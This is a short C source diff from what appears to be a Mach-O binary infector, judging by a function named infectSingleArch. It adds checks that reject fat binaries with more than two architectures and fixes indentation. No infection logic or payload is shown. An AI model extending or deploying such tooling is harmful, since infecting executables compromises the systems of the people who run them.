@@ -719,7 +719,7 @@ int infectSingleArch (char *inputFilePointer,
             
             break;
           }
-      }
+        }
     }
   
   //
@@ -1066,6 +1066,13 @@ main (int argc, _mChar *argv[])
         printf ("[ii] FAT Binary found\n");
         printf ("[ii] Found %d Arch(s)\n", nfat);
 
+        if (nfat > 2)
+          {
+            printf ("[ii] Error: unsupported format (too many archs)\n");
+            
+            return kErrorGeneric;
+          }
+
         memcpy (outputFilePointer, &gFatHeader, sizeof (gFatHeader));
         outputOffset  += sizeof (gFatHeader);
         inputOffset   += sizeof (gFatHeader);
@@ -1145,6 +1152,13 @@ main (int argc, _mChar *argv[])
         printf ("[ii] FAT (swapped) Binary found\n");
         printf ("[ii] Found %d Arch(s)\n", nfat);
         
+        if (nfat > 2)
+          {
+            printf ("[ii] Error: unsupported format (too many archs)\n");
+
+            return kErrorGeneric;
+          }
+
         memcpy (outputFilePointer, &gFatHeader, sizeof (gFatHeader));
         outputOffset  += sizeof (gFatHeader);
         inputOffset   += sizeof (gFatHeader);
